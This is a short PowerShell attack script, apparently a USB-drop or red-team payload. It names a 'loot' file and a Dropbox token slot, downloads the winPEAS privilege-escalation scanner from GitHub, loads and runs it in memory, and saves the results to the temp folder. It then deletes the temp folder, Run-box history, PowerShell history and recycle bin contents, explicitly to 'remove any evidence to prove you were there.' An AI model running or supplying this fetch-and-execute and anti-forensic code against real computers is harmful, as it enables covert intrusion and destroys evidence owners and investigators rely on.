$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"

# MAKE LOOT FOLDER
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"

# Get latest release
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"

# One liner to download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") >> $env:TMP\$FileName

<#
.NOTES
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
